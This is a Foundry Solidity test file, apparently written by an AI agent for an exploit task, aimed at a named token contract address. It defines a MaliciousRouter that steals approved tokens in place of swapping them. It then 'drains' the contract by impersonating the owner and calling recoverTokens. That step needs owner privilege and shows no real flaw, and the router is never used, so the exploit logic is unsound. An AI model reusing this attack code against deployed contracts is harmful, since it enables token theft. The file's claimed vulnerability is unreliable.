// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Merged the two ISgrok interfaces into one to resolve the "Identifier already declared" error.
interface ISgrok {
    function owner() external view returns (address);
    function updateUniswapV2Router(address newAddress) external;
    function enableTrading() external;
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function recoverTokens(address tokenAddress, uint256 amountToRecover) external;
}

interface IERC20 {
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

// Moved the MaliciousRouter contract to the top level.
contract MaliciousRouter {
    address public immutable token;
    address public immutable attacker;

    constructor(address _token, address _attacker) {
        token = _token;
        attacker = _attacker;
    }

    // This function gets called by the victim contract (SpaceGrok).
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external {
        // The victim contract has just approved 'amountIn' tokens to this contract.
        // Instead of swapping, we steal the tokens.
        uint256 approvedAmount = IERC20(token).allowance(msg.sender, address(this));
        IERC20(token).transferFrom(msg.sender, attacker, approvedAmount);
    }

    // Add fallback/receive to handle any potential ETH transfers and avoid reverts.
    fallback() external payable {}
    receive() external payable {}
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    
    address constant TARGET = 0x58718Fd4567517d9a713a1f9f3de6cbF9404E59e;
    address attacker = address(this);
    MaliciousRouter maliciousRouter;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        maliciousRouter = new MaliciousRouter(TARGET, attacker);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // The hint was a red herring. The real vulnerability is a direct drain via recoverTokens.
        
        // 1. Set up the precondition: contract must have tokens to be drained.
        // The prompt states the balance is >= swapTokensAtAmount.
        uint256 drainAmount = 500_000 * 1e18;
        deal(TARGET, TARGET, drainAmount);
        
        // 2. Get owner and impersonate them.
        address owner = ISgrok(TARGET).owner();
        vm.startPrank(owner);
        
        // 3. Call recoverTokens to drain the contract's entire balance of its own token.
        // This works because address(this) is excluded from fees, bypassing swap logic.
        ISgrok(TARGET).recoverTokens(TARGET, drainAmount);
        
        vm.stopPrank();
    }

        

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}